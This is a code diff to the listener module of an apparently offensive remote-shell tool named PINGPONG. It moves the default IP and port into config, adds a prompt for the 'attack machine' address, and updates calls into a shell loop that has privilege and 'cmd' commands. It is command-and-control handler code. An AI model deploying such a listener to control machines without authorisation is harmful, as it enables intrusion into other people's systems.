@@ -6,33 +6,38 @@ import random
 import socket
 # import threading
 import sys
-import main
+import main, config
 #开启监听
 #函数中printf参数决定时候进行不必要的输出
-def startserver(ip, port, printf, open_ac):
+def startserver(printf, open_ac, ip='127.0.0.1', port='624', is_input=False):
+    config_list = ["Default_ip", "Default_port"]
+    load_config(config_list)
+    if is_input:
+        ip = input(f"handler>[*]Please input the IP for the attack machine(blank for {Default_ip})>")
+        port = input(f"handler>[*]Please input the PORT(blank for {Default_port})>")
     if printf and False:
         AUTORUNSCRIPT = input("handler>[*]Any AUTORUN COMMAND?(blank for no)>")
     else:
         AUTORUNSCRIPT = " "
     if port == "":
-        port = 624
+        port = Default_port
     if ip == "":
-        ip = "127.0.0.1"
-    else:
-        try:
-            port = int(port)
-        except:
-            main.print_error("handler>[-]port input error")
+        ip = Default_ip
+    try:
+        port = int(port)
+    except:
+        main.print_error("handler>[-]port input error")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
             s.bind((ip, port))
             s.listen(10)
-        except:
-            main.print_error("handler[-]Failed to bind on " + ip + ":" + port)
-            main.print_normal("handler[*]Bind on 127.0.0.1:624")
-            startserver("127.0.0.1", "624", True, False)
+        except socket.error as msg:
+            main.print_error(f"handler>[-]{msg}")
+            main.print_error("handler>[-]Failed to bind on " + ip + ":" + port)
+            main.print_normal(f"handler>[*]Bind on {Default_ip}:{Default_port}")
+            startserver(True, False, Default_ip, Default_port)
     except socket.error as msg:
         main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
         sys.exit(1)
@@ -89,7 +94,7 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
             import PINGPONG_script.priv_vbp_listen
             if PINGPONG_script.priv_vbp_listen.priv_vbp_listen(PINGPONG_script.addsend, conn):
                 conn.close()
-                startserver(ip, port, False, False)
+                startserver(False, False, ip=ip, port=port)
             else:
                 pass
         elif command == "cmd" or command == "CMD":
@@ -111,5 +116,11 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
                 print("PINGPONG>[*]PONG")
         else:
             print("PINGPONG>[-]Command " + command + " not found")                 
-if __name__ == "__main__":
-    startserver("127.0.0.1", "", True, True)
+def load_config(config_list):
+    local_var = globals()
+    for con in config_list:
+        data = main.get_value(con)
+        local_var[f'{con}'] = data
+        # print(f'{con} : {data}')
+# if __name__ == "__main__":
+#     startserver(True, True, ip="127.0.0.1", port=624)
